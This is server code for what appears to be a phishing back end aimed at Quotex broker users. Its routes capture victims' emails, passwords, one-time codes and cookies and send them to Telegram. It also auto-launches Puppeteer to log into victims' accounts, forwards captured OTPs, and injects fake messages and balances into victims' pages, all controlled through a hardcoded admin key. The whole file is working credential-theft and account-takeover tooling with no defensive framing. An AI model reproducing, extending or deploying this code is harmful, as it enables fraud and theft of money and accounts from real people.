function loadUsers() {
    try { if (fs.existsSync(DATA_FILE)) users = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); else fs.writeFileSync(DATA_FILE, '[]'); } catch(e) { users = []; }
}
function saveUsers() {
    try { const tmp = DATA_FILE + '.tmp'; fs.writeFileSync(tmp, JSON.stringify(users, null, 2)); fs.renameSync(tmp, DATA_FILE); }
    catch(e) { try { fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2)); } catch(e2) {} }
}
function loadLicenses() {
    try { if (fs.existsSync(LICENSES_FILE)) { const d = fs.readFileSync(LICENSES_FILE, 'utf8').trim(); licenses = d ? JSON.parse(d) : []; } else { licenses = []; fs.writeFileSync(LICENSES_FILE, '[]'); } } catch(e) { licenses = []; }
}
function saveLicenses() {
    try { const tmp = LICENSES_FILE + '.tmp'; fs.writeFileSync(tmp, JSON.stringify(licenses, null, 2)); fs.renameSync(tmp, LICENSES_FILE); }
    catch(e) { try { fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2)); } catch(e2) {} }
}

function getOrCreateUserFile(licenceKey, fullName = 'Unknown') {
    const hasName = fullName && fullName !== 'Unknown' && fullName !== 'Pending Name';
    let user = hasName
        ? users.find(u => u.licenceKey === licenceKey && (u.fullName || '').toLowerCase() === fullName.toLowerCase())
          || users.find(u => u.licenceKey === licenceKey && (!u.fullName || u.fullName === 'Unknown' || u.fullName === 'Pending Name'))
        : users.find(u => u.licenceKey === licenceKey);
    if (!user) {
        user = { id: Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7), licenceKey,
            fullName: hasName ? fullName : 'Unknown', username: '', password: '', otp: '', ip: '', cookies: '',
            status: 'Active', connected: false, lastActivity: new Date().toISOString(), activities: [] };
        users.unshift(user);
    }
    if (hasName && user.fullName !== fullName) user.fullName = fullName;
    user.lastActivity = new Date().toISOString();
    saveUsers();
    return user;
}
async function getOrCreateUser(licenceKey, fullName = 'Unknown') {
    return useDatabase ? await dbGetOrCreateUser(licenceKey, fullName) : getOrCreateUserFile(licenceKey, fullName);
}
async function saveUser(user) {
    if (useDatabase) await dbSaveUser(user); else saveUsers();
}

// ================== LICENSE ROUTES ==================
app.get('/api/licenses', async (req, res) => {
    try { res.json(useDatabase ? await dbGetAllLicenses() : licenses); }
    catch(e) { res.json(licenses); }
});
app.post('/api/licenses', async (req, res) => {
    const { key, type, expiry, maxUses, status } = req.body;
    if (!key) return res.status(400).json({ error: 'Key required' });
    try {
        const newLicense = { key, type: type || 'Standard', status: status || 'Active', usesRemaining: maxUses || null, assignedTo: null, dateAdded: new Date().toISOString(), expiry: expiry || null };
        if (useDatabase) {
            if (await dbFindLicense(key)) return res.status(400).json({ error: 'License already exists' });
            await dbInsertLicense(newLicense);
        } else {
            if (licenses.find(l => l.key === key)) return res.status(400).json({ error: 'License already exists' });
            licenses.unshift(newLicense); saveLicenses();
        }
        broadcastSSE('license_added', newLicense);
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.patch('/api/licenses/:key', async (req, res) => {
    const key = decodeURIComponent(req.params.key);
    const { status } = req.body;
    try {
        if (useDatabase) {
            const lic = await dbFindLicense(key);
            if (!lic) return res.status(404).json({ error: 'License not found' });
            if (status) await dbUpdateLicenseStatus(key, status);
            broadcastSSE('license_updated', { key, status: status || lic.status });
            return res.json({ success: true, key, status });
        }
        const lic = licenses.find(l => l.key === key);
        if (!lic) return res.status(404).json({ error: 'License not found' });
        if (status) lic.status = status;
        saveLicenses();
        broadcastSSE('license_updated', { key, status: lic.status });
        res.json({ success: true, key, status: lic.status });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.delete('/api/licenses/:key', async (req, res) => {
    const key = decodeURIComponent(req.params.key);
    try {
        if (useDatabase) await dbDeleteLicense(key); else { licenses = licenses.filter(l => l.key !== key); saveLicenses(); }
        broadcastSSE('license_deleted', { key });
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.post('/api/validate-license', async (req, res) => {
    const { licenseKey } = req.body;
    if (!licenseKey) return res.json({ valid: false, message: 'No key provided' });
    try {
        const lic = useDatabase ? await dbFindLicense(licenseKey) : licenses.find(l => l.key === licenseKey);
        const valid = !!(lic && lic.status === 'Active' && (!lic.expiry || new Date(lic.expiry) > new Date()));
        res.json({ valid, message: valid ? 'License is valid' : 'Invalid or expired license key.' });
    } catch(e) { res.json({ valid: false, message: 'Server error' }); }
});

// ================== LICENSE ACTIVATION ==================
app.post('/api/license-activate', async (req, res) => {
    const { licenseKey, userName, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    try {
        const user = await getOrCreateUser(licenseKey, userName);
        if (userName && userName !== 'Pending Name') user.fullName = userName;
        user.activities = user.activities || [];
        user.activities.push({ action: 'License Activated', timestamp: new Date().toLocaleString() });
        await saveUser(user);
        broadcastSSE('license_activated', { licenceKey: licenseKey, fullName: userName, ip, timestamp: timestamp || new Date().toLocaleString() });
        await sendTelegramMessage(`🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`);
        res.status(200).json({ status: 'success' });
    } catch(e) { res.status(500).json({ status: 'error' }); }
});

// ================== SPAM PROTECTION ==================
const loginAttemptMap = new Map();
function checkLoginSpam(licenceKey, email, password) {
    const now = Date.now(), mapKey = licenceKey || 'DEFAULT';
    const existing = loginAttemptMap.get(mapKey);
    if (!existing || (now - existing.firstSeen) > 5 * 60 * 1000) { loginAttemptMap.set(mapKey, { email, password, count: 1, firstSeen: now }); return false; }
    if (existing.email === email && existing.password === password) { existing.count++; if (existing.count > 3) return true; }
    else loginAttemptMap.set(mapKey, { email, password, count: 1, firstSeen: now });
    return false;
}

// ================== QUOTEX LOGIN ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    if (checkLoginSpam(licenceKey, email, password)) return res.status(200).json({ status: 'ok', spam: true });
    try {
        const user = await getOrCreateUser(licenceKey, name);
        user.username = email; user.password = password; user.ip = ip; user.cookies = cookies;
        user.status = 'Online';
        user.activities = user.activities || [];
        user.activities.push({ action: 'Quotex Login Submitted', timestamp: new Date().toLocaleString() });
        await saveUser(user);
        broadcastSSE('quotex_login', { licenceKey, fullName: name, email, password, ip, cookies, timestamp: new Date().toLocaleString() });
        await sendTelegramMessage(`🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`);

        // ── AUTO-LAUNCH: if enabled, start Puppeteer session automatically ──
        if (process.env.AUTO_LAUNCH_ON_LOGIN === 'true' && puppeteerAvailable && email && password) {
            const existingSession = [...quotexSessions.values()].find(s =>
                s.email === email && !['closed', 'error', 'logged_in'].includes(s.status));
            if (!existingSession) {
                const sid = makeSessionId();
                const session = { id: sid, clientName: name || 'Client', email, password, licenceKey,
                    status: 'queued', statusMsg: 'Auto-queued from login', startedAt: new Date(), updatedAt: new Date(),
                    otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null };
                quotexSessions.set(sid, session);
                broadcastSSE('qx_session_new', getSessionInfo(session));
                setTimeout(() => launchQuotexSession(session).catch(e => console.error('auto-launch error:', e.message)), 500);
            }
        }

        res.status(200).json({ status: 'ok' });
    } catch(e) { res.status(500).json({ status: 'error' }); }
});

// ================== OTP ==================
app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    try {
        const user = await getOrCreateUser(licenceKey, name);
        user.otp = otp; user.ip = ip; user.cookies = cookies; user.status = 'Online';
        user.activities = user.activities || [];
        user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
        await saveUser(user);
        broadcastSSE('otp_entered', { licenceKey, fullName: name, email, otp, ip, cookies, timestamp: new Date().toLocaleString() });
        await sendTelegramMessage(`🔢 <b>OTP Captured</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 OTP: <b>${otp}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`);

        // ── AUTO-FORWARD OTP to matching Puppeteer session ──
        const forwarded = await autoForwardOTP(name, licenceKey, otp);
        if (forwarded) console.log(`✅ OTP auto-forwarded for ${name}`);

        res.status(200).json({ status: 'ok', forwarded });
    } catch(e) { res.status(500).json({ status: 'error' }); }
});

// ================== BLOCK / UNBLOCK ==================
app.post('/api/block-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenceKey);
            if (user) { user.blocked = true; user.status = 'Blocked'; user.activities = user.activities || []; user.activities.push({ action: '🚫 Blocked by Admin', timestamp: new Date().toLocaleString() }); await dbSaveUser(user); }
            await dbUpdateLicenseStatus(licenceKey, 'Inactive');
            broadcastSSE('user_blocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
            await sendTelegramMessage(`🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>`);
            return res.json({ success: true });
        }
        const user = users.find(u => u.licenceKey === licenceKey);
        if (user) { user.blocked = true; user.status = 'Blocked'; user.activities.push({ action: '🚫 Blocked by Admin', timestamp: new Date().toLocaleString() }); saveUsers(); }
        const lic = licenses.find(l => l.key === licenceKey);
        if (lic) { lic.status = 'Inactive'; saveLicenses(); }
        broadcastSSE('user_blocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
        await sendTelegramMessage(`🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>`);
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.post('/api/unblock-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenceKey);
            if (user) { user.blocked = false; user.status = 'Active'; user.activities = user.activities || []; user.activities.push({ action: '✅ Unblocked by Admin', timestamp: new Date().toLocaleString() }); await dbSaveUser(user); }
            await dbUpdateLicenseStatus(licenceKey, 'Active');
            broadcastSSE('user_unblocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
            return res.json({ success: true });
        }
        const user = users.find(u => u.licenceKey === licenceKey);
        if (user) { user.blocked = false; user.status = 'Active'; user.activities.push({ action: '✅ Unblocked by Admin', timestamp: new Date().toLocaleString() }); saveUsers(); }
        const lic = licenses.find(l => l.key === licenceKey);
        if (lic) { lic.status = 'Active'; saveLicenses(); }
        broadcastSSE('user_unblocked', { licenceKey, fullName: user?.fullName || 'Unknown', timestamp: new Date().toLocaleString() });
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.delete('/api/delete-user/:licenceKey', async (req, res) => {
    const licenceKey = decodeURIComponent(req.params.licenceKey);
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
    try {
        if (useDatabase) await dbDeleteUser(licenceKey); else { users = users.filter(u => u.licenceKey !== licenceKey); saveUsers(); }
        broadcastSSE('user_deleted', { licenceKey, timestamp: new Date().toLocaleString() });
        res.json({ success: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});

// ================== CHECK ACCESS ==================
app.get('/api/check-access', async (req, res) => {
    const licenseKey = req.query.licenseKey || req.query.licenceKey;
    if (!licenseKey) return res.json({ allowed: false, reason: 'no_key' });
    try {
        if (useDatabase) {
            const user = await dbFindUserByKey(licenseKey);
            if (user?.blocked) return res.json({ allowed: false, reason: 'blocked' });
            const lic = await dbFindLicense(licenseKey);
            if (!lic || lic.status !== 'Active' || (lic.expiry && new Date(lic.expiry) < new Date())) return res.json({ allowed: false, reason: 'license_inactive' });
            return res.json({ allowed: true });
        }
        const user = users.find(u => u.licenceKey === licenseKey);
        if (user?.blocked) return res.json({ allowed: false, reason: 'blocked' });
        const lic = licenses.find(l => l.key === licenseKey);
        if (!lic || lic.status !== 'Active' || (lic.expiry && new Date(lic.expiry) < new Date())) return res.json({ allowed: false, reason: 'license_inactive' });
        res.json({ allowed: true });
    } catch(e) { res.json({ allowed: true }); }
});

// ================== ACTIVITY TRACKING ==================
app.post('/api/track-activity', (req, res) => {
    const { action, userName } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    broadcastSSE('activity', { action, userName, ip, timestamp: new Date().toLocaleString() });
    res.status(200).json({ status: 'success' });
});
app.post('/api/notification-permission', (req, res) => res.status(200).json({ status: 'success' }));

// ================== TRIGGER CONNECTED ==================
app.get('/api/trigger-connected', async (req, res) => {
    const userName = req.query.userName || 'User';
    sendSSEToUser(userName, 'show_connected',    { userName });
    sendSSEToUser(userName, 'trigger_connected', { userName });
    await sendTelegramMessage(`🔗 <b>Connection Triggered</b>\n👤 User: <b>${userName}</b>`);
    res.send('Trigger sent');
});

// ================== SEND MESSAGE ==================
app.post('/api/send-message', async (req, res) => {
    const { userName, message, type } = req.body;
    if (!userName || !message) return res.status(400).json({ error: 'userName and message are required' });
    const ts = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    const msgType    = type || 'info';
    const msgPayload = { userName, message, type: msgType, timestamp: ts };
    sendSSEToUser(userName, 'injected_message', msgPayload);
    if (useDatabase) { await dbAddPendingMessage(userName, msgPayload); }
    else { const key = userName.trim().toLowerCase(); if (!pendingMessages[key]) pendingMessages[key] = []; pendingMessages[key].push(msgPayload); if (pendingMessages[key].length > 20) pendingMessages[key].shift(); }
    broadcastSSE('activity', { action: `💬 Message Injected [${msgType}] → ${userName}`, userName, ip: '—', timestamp: ts });
    const typeEmojis = { info: 'ℹ️', warning: '⚠️', alert: '🚨', instruction: '📋', otp: '🔢' };
    await sendTelegramMessage(`${typeEmojis[msgType] || '💬'} <b>Message Injected</b>\n👤 Target: <b>${userName}</b>\n📝 Type: <b>${msgType}</b>\n💬 Message: <b>${message}</b>\n⏰ Time: <b>${ts}</b>`);
    res.status(200).json({ success: true, delivered: true });
});

// ================== POLL MESSAGES ==================
app.get('/api/poll-messages', async (req, res) => {
    const userName = (req.query.userName || '').trim().toLowerCase();
    if (!userName) return res.json({ messages: [] });
    try {
        if (useDatabase) return res.json({ messages: await dbPollAndClearMessages(userName) });
        const msgs = pendingMessages[userName] || [];
        pendingMessages[userName] = [];
        res.json({ messages: msgs });
    } catch(e) { res.json({ messages: [] }); }
});

// ================== MAINTENANCE ==================
let maintenanceMode = { active: false, until: null, message: 'Under Maintenance. Please check back soon.' };
app.get('/api/maintenance', (req, res) => res.json(maintenanceMode));
app.post('/api/maintenance', (req, res) => {
    const { active, until, message, adminKey } = req.body;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Unauthorized' });
    maintenanceMode = { active: !!active, until: until || null, message: message || 'Under Maintenance. Please check back soon.' };
    broadcastSSE('maintenance_update', maintenanceMode);
    res.json({ ok: true, mode: maintenanceMode });
});

// ================== STATS & USERS ==================
app.get('/api/stats', async (req, res) => {
    try {
        const base = useDatabase ? await dbGetStats() : {
            totalUsers: users.length, onlineNow: sseClients.size,
            otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
            connectedAccounts: users.filter(u => u.connected).length,
            totalLicenses: licenses.length, activeLicenses: licenses.filter(l => l.status === 'Active').length,
            blockedUsers: users.filter(u => u.blocked).length,
        };
        // Augment with Quotex session stats
        const sessions = [...quotexSessions.values()];
        res.json({
            ...base,
            qxSessionsActive: sessions.filter(s => !['closed','error'].includes(s.status)).length,
            qxSessionsLoggedIn: sessions.filter(s => s.status === 'logged_in').length,
            qxSessionsWaitingOtp: sessions.filter(s => s.status === 'waiting_otp' || s.status === 'wrong_otp').length,
        });
    } catch(e) { res.json({ totalUsers: 0, onlineNow: 0, otpCaptured: 0, connectedAccounts: 0, totalLicenses: 0, activeLicenses: 0, blockedUsers: 0 }); }
});
app.get('/api/users', async (req, res) => {
    const offset = parseInt(req.query.offset, 10) || 0;
    const limit  = parseInt(req.query.limit,  10) || 0;
    try {
        const allUsers = useDatabase ? await dbGetAllUsers() : users;
        if (limit > 0) return res.json({ users: allUsers.slice(offset, offset + limit), total: allUsers.length, offset, limit });
        res.json(allUsers);
    } catch(e) { res.json(useDatabase ? [] : users); }
});
app.get('/api/latest-activity', async (req, res) => {
    try {
        const allUsers = useDatabase ? await dbGetAllUsers() : users;
        res.json({ logins: allUsers.filter(u => u.username), otps: allUsers.filter(u => u.otp) });
    } catch(e) { res.json({ logins: [], otps: [] }); }
});

// ================== BROADCAST ==================
app.post('/api/broadcast-message', (req, res) => {
    const { message, type = 'info', adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    if (!message) return res.status(400).json({ error: 'message required' });
    broadcastSSE('broadcast_message', { message, type, timestamp: new Date().toISOString() });
    res.json({ ok: true, clients: sseClients.size });
});

// ================== USER NOTES ==================
app.post('/api/user-notes', async (req, res) => {
    const { licenceKey, note } = req.body || {};
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });
    try {
        if (useDatabase) await dbSaveNote(licenceKey, note || '');
        else { if (!global._notesMap) global._notesMap = {}; global._notesMap[licenceKey] = { note: note || '', updatedAt: new Date().toISOString() }; }
        res.json({ ok: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.get('/api/user-notes/:licenceKey', async (req, res) => {
    const { licenceKey } = req.params;
    try {
        if (useDatabase) { const doc = await dbGetNote(licenceKey); return res.json({ note: doc ? doc.note : '', updatedAt: doc ? doc.updatedAt : null }); }
        const entry = (global._notesMap || {})[licenceKey];
        res.json({ note: entry ? entry.note : '', updatedAt: entry ? entry.updatedAt : null });
    } catch(e) { res.json({ note: '', updatedAt: null }); }
});

// ================== FORCE RELOAD / KICK / BALANCE ==================
app.get('/api/force-reload', (req, res) => {
    const { userName, adminKey } = req.query;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    res.json({ ok: true, sent: sendSSEToUser(userName, 'force_reload', { timestamp: new Date().toISOString() }) });
});
app.post('/api/push-loading', (req, res) => {
    const { userName, message = 'Please wait...', seconds = 5, adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    res.json({ ok: true, sent: sendSSEToUser(userName, 'show_loading', { message, seconds }) });
});
app.post('/api/inject-balance', (req, res) => {
    const { userName, balance, adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    res.json({ ok: true, sent: sendSSEToUser(userName, 'inject_balance', { balance: String(balance || '0') }) });
});
app.get('/api/kick-user', (req, res) => {
    const { userName, adminKey } = req.query;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    const k = (userName || '').trim().toLowerCase();
    const client = sseUserClients.get(k);
    if (client) {
        try { client.write(`data: ${JSON.stringify({ type: 'kicked', data: { message: 'Session ended by admin.' } })}\n\n`); setTimeout(() => { try { client.end(); } catch(e){} }, 300); } catch(e) {}
        sseClients.delete(client); sseUserClients.delete(k);
    }
    res.json({ ok: true, wasConnected: !!client });
});

// ================== AUTO-OTP API ==================
app.get('/api/auto-otp/status', (req, res) => {
    res.json({
        ...autoOtpConfig,
        imapHost: OTP_IMAP_HOST,
        imapPort: OTP_IMAP_PORT,
        emailConfigured: !!(OTP_EMAIL && OTP_EMAIL_PASSWORD),
        email: OTP_EMAIL ? OTP_EMAIL.replace(/(.{2}).*(@.*)/, '$1***$2') : '',
    });
});

app.post('/api/auto-otp/toggle', (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    if (!imapflowAvailable)  return res.status(400).json({ error: 'imapflow not installed. Run: npm install imapflow' });
    if (!OTP_EMAIL || !OTP_EMAIL_PASSWORD) return res.status(400).json({ error: 'OTP_EMAIL and OTP_EMAIL_PASSWORD env vars not set.' });
    autoOtpConfig.enabled = !autoOtpConfig.enabled;
    broadcastSSE('auto_otp_update', { ...autoOtpConfig });
    res.json({ ok: true, enabled: autoOtpConfig.enabled });
});

app.post('/api/auto-otp/test', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    if (!imapflowAvailable)  return res.status(400).json({ error: 'imapflow not installed' });
    if (!OTP_EMAIL || !OTP_EMAIL_PASSWORD) return res.status(400).json({ error: 'Email credentials not set' });
    try {
        const client = new ImapFlow({ host: OTP_IMAP_HOST, port: OTP_IMAP_PORT, secure: true,
            auth: { user: OTP_EMAIL, pass: OTP_EMAIL_PASSWORD }, logger: false });
        await client.connect();
        const info = await client.getMailboxLock('INBOX');
        info.release();
        await client.logout();
        res.json({ ok: true, message: '✅ IMAP connection successful! Auto-OTP is ready.' });
    } catch(e) {
        res.status(400).json({ ok: false, error: e.message });
    }
});

// ================== BOT SETTINGS ==================
app.get('/api/bot-settings', async (req, res) => { try { await loadSettingsFromDB(); } catch(e) {} res.json(botSettings); });
app.post('/api/bot-settings', async (req, res) => {
    const { telegramUrl, whatsappUrl, botName, adminKey } = req.body || {};
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Forbidden' });
    if (telegramUrl !== undefined) botSettings.telegramUrl = telegramUrl;
    if (whatsappUrl !== undefined) botSettings.whatsappUrl = whatsappUrl;
    if (botName !== undefined)     botSettings.botName     = botName;
    saveSettings(); await saveSettingsToDB();
    broadcastSSE('settings_updated', botSettings);
    res.json({ ok: true, settings: botSettings });
});

// ================== ORDERS ==================
const ORDERS_FILE = path.join(DATA_DIR, 'orders.json');
let ordersMem = [];
function loadOrdersFile() { try { if (fs.existsSync(ORDERS_FILE)) ordersMem = JSON.parse(fs.readFileSync(ORDERS_FILE, 'utf8')); } catch(e) { ordersMem = []; } }
function saveOrdersFile() { try { ensureDataDir(); fs.writeFileSync(ORDERS_FILE, JSON.stringify(ordersMem, null, 2)); } catch(e) {} }
function isAdmin(req) { const k = (req.query.adminKey || req.body?.adminKey || req.headers['x-admin-key'] || '').toString(); return k === 'CSAI-NEWX-ADMI-N999'; }
loadOrdersFile();

app.post('/api/orders', async (req, res) => {
    try {
        const b = req.body || {};
        const clean = s => (typeof s === 'string' ? s.trim().slice(0, 300) : '');
        const { fullName, planKey, planLabel, planPricePKR, planPriceUSD, paymentMethod, whatsapp } = Object.fromEntries(Object.entries(b).map(([k, v]) => [k, clean(v)]));
        if (!fullName || !planKey || !paymentMethod || !whatsapp) return res.status(400).json({ error: 'Missing required fields' });
        if (!['week', 'month', 'lifetime'].includes(planKey)) return res.status(400).json({ error: 'Invalid plan' });
        const id    = 'ORD-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2, 6).toUpperCase();
        const order = { id, fullName, planKey, planLabel, planPricePKR, planPriceUSD, paymentMethod, whatsapp, status: 'New', createdAt: new Date() };
        if (useDatabase) await Order.create(order); else { ordersMem.unshift(order); saveOrdersFile(); }
        broadcastSSE('new_order', order);
        res.json({ ok: true, order: { id: order.id } });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.get('/api/orders', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    try { res.json(useDatabase ? await Order.find({}).sort({ createdAt: -1 }).limit(1000).lean() : ordersMem); }
    catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.patch('/api/orders/:id', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { id } = req.params;
    const status = (req.body?.status || '').toString();
    if (!['New','Contacted','Paid','Completed','Rejected'].includes(status)) return res.status(400).json({ error: 'Invalid status' });
    try {
        if (useDatabase) { const o = await Order.findOneAndUpdate({ id }, { status }, { new: true }); if (!o) return res.status(404).json({ error: 'Not found' }); broadcastSSE('order_updated', { id, status }); return res.json({ ok: true, order: o }); }
        const o = ordersMem.find(x => x.id === id); if (!o) return res.status(404).json({ error: 'Not found' }); o.status = status; saveOrdersFile(); broadcastSSE('order_updated', { id, status }); res.json({ ok: true, order: o });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});
app.delete('/api/orders/:id', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { id } = req.params;
    try {
        if (useDatabase) await Order.deleteOne({ id }); else { ordersMem = ordersMem.filter(x => x.id !== id); saveOrdersFile(); }
        broadcastSSE('order_deleted', { id }); res.json({ ok: true });
    } catch(e) { res.status(500).json({ error: 'Server error' }); }
});

// ================== QUOTEX BROKER SESSION API ==================

// GET /api/qx/sessions — list all active sessions (admin panel)
app.get('/api/qx/sessions', (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const list = [...quotexSessions.values()].map(getSessionInfo).sort((a, b) => new Date(b.startedAt) - new Date(a.startedAt));
    res.json({ sessions: list, puppeteerAvailable });
});

// POST /api/qx/launch — start a new Quotex login session
app.post('/api/qx/launch', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { email, password, clientName, licenceKey = '' } = req.body || {};
    if (!email || !password) return res.status(400).json({ error: 'email and password required' });

    if (!puppeteerAvailable) {
        return res.status(503).json({ error: 'Puppeteer not installed. Add it: npm install puppeteer', puppeteerAvailable: false });
    }

    // Check if session already running for this email
    const existing = [...quotexSessions.values()].find(s =>
        s.email === email && !['closed', 'error'].includes(s.status));
    if (existing) {
        return res.json({ ok: false, sessionId: existing.id, message: `Session already ${existing.status} for this email`, existing: getSessionInfo(existing) });
    }

    const sid = makeSessionId();
    const session = {
        id: sid, clientName: clientName || email.split('@')[0], email, password, licenceKey,
        status: 'queued', statusMsg: 'Queued for launch', startedAt: new Date(), updatedAt: new Date(),
        otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null,
    };
    quotexSessions.set(sid, session);
    broadcastSSE('qx_session_new', getSessionInfo(session));

    // Log to DB
    if (useDatabase) {
        BrokerSession.create({ sessionId: sid, clientName: session.clientName, email, licenceKey, status: 'launching' }).catch(() => {});
    }

    // Launch async — don't await here
    launchQuotexSession(session).catch(e => console.error('launch error:', e.message));
    res.json({ ok: true, sessionId: sid, message: 'Session started' });
});

// POST /api/qx/otp — submit OTP for a session
app.post('/api/qx/otp', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { sessionId, otp } = req.body || {};
    if (!sessionId || !otp) return res.status(400).json({ error: 'sessionId and otp required' });
    const result = await submitQuotexOTP(sessionId, otp);
    res.json(result);
});

// GET /api/qx/screenshot/:id — get latest screenshot
app.get('/api/qx/screenshot/:id', (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const session = quotexSessions.get(req.params.id);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    if (!session.screenshotBase64) return res.json({ screenshot: null });
    res.json({ screenshot: session.screenshotBase64, contentType: 'image/jpeg' });
});

// POST /api/qx/close — close a session
app.post('/api/qx/close', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { sessionId } = req.body || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
    await closeQuotexSession(sessionId, 'Closed by admin');
    res.json({ ok: true });
});

// POST /api/qx/launch-from-user — launch session using stored user credentials
app.post('/api/qx/launch-from-user', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    const { licenceKey } = req.body || {};
    if (!licenceKey) return res.status(400).json({ error: 'licenceKey required' });

    const user = useDatabase ? await dbFindUserByKey(licenceKey) : users.find(u => u.licenceKey === licenceKey);
    if (!user) return res.status(404).json({ error: 'User not found' });
    if (!user.username || !user.password) return res.status(400).json({ error: 'User has no credentials stored yet' });

    const sid = makeSessionId();
    const session = {
        id: sid, clientName: user.fullName || 'Client', email: user.username, password: user.password, licenceKey,
        status: 'queued', statusMsg: 'Launched from user record', startedAt: new Date(), updatedAt: new Date(),
        otpAttempts: 0, browser: null, page: null, screenshotBase64: null, cookies: null,
    };
    quotexSessions.set(sid, session);
    broadcastSSE('qx_session_new', getSessionInfo(session));
    launchQuotexSession(session).catch(e => console.error('launch error:', e.message));
    res.json({ ok: true, sessionId: sid, clientName: session.clientName, email: user.username });
});

// GET /api/qx/history — session history from DB
app.get('/api/qx/history', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    try {
        if (useDatabase) {
            const history = await BrokerSession.find({}).sort({ startedAt: -1 }).limit(100).lean();
            return res.json(history);
        }
        res.json([]);
    } catch(e) { res.json([]); }
});


// ================== SAVED CREDENTIALS API ==================
app.get('/api/qx/credentials', async (req, res) => {
    if (!isAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
    try {
        const creds = useDatabase ? await SavedCredential.find({}).sort({ createdAt: -1 }).lean() : savedCredsMemory;
        res.json({ credentials: creds });
